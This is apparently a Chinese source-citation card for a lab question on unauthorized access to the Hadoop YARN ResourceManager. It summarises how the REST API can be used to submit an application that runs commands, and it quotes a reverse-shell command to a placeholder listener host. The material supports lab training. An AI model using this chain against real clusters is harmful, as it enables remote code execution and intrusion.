# 第130题来源｜Hadoop YARN ResourceManager 未授权

## 题库字段（本地资料，不计外部来源数）

- 题名：`vulfocus/hadoop`
- 镜像：`vulfocus/hadoop`
- 题库端口：空
- 无 CVE。

## 外部来源（5 个唯一链接）

### [S1] 本题镜像 Docker Hub

- 链接：[vulfocus/hadoop](https://hub.docker.com/r/vulfocus/hadoop)
- 类型：镜像说明。
- 用途：要求在 Vulfocus 用 DockerCompose 导入；服务为 datanode/namenode/nodemanager/resourcemanager；环境变量 `CLUSTER_NAME=vulhub`；RM 映射 `8088:8088` 与 `8032:8032`。支撑端口、必须组集群、以及与 Vulhub unauthorized-yarn 为同一套启动方式。

### [S2] Vulhub README

- 链接：[vulhub/hadoop/unauthorized-yarn/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/README.zh-cn.md)
- 类型：靶场 README。
- 用途：RM WebUI `http://your-ip:8088`；无 Hadoop 客户端也可走 REST；步骤为监听 → New Application → Submit Application。支撑步骤 1、3 与“输出不在 HTTP 响应”。

### [S3] Vulhub 利用脚本

- 链接：[unauthorized-yarn/exploit.py](https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py)
- 类型：PoC。
- 用途：`POST .../ws/v1/cluster/apps/new-application` 取 `application-id`；再 `POST .../ws/v1/cluster/apps`，JSON 含 `am-container-spec.commands.command` 反连 `/bin/bash -i >& /dev/tcp/<lhost>/9999`，`application-type` 为 `YARN`。支撑步骤 2–3。

### [S4] Apache 官方 REST

- 链接：[Hadoop 2.7.3 ResourceManager REST APIs](https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html)
- 类型：官方文档。
- 用途：New Application：`POST /ws/v1/cluster/apps/new-application` 返回 `application-id`；Submit：`POST /ws/v1/cluster/apps`，body 含 `application-id`、`am-container-spec`（含 `commands`）、`application-type`；成功 202 + Location。注明提交接口需要请求中有用户名、无 filter 时可能 UNAUTHORIZED。支撑字段名与认证排坑。

### [S5] Vulfocus 平台实操

- 链接：[什么是未授权访问漏洞？Hadoop & Redis靶场实战——Vulfocus服务攻防](https://cn-sec.com/archives/2901112.html)
- 类型：平台题解（转载自微信公众号「小羽网安」）。
- 用途：在 Vulfocus 搜 hadoop 启动后，WebUI 版本 **2.8.1**，对映射地址发与 Vulhub 相同的 new-application / submit JSON。支撑“本题平台环境即该未授权 YARN 链”。文中“3.3.0 以下”无对应 CVE，卡片不采用该版本断言。
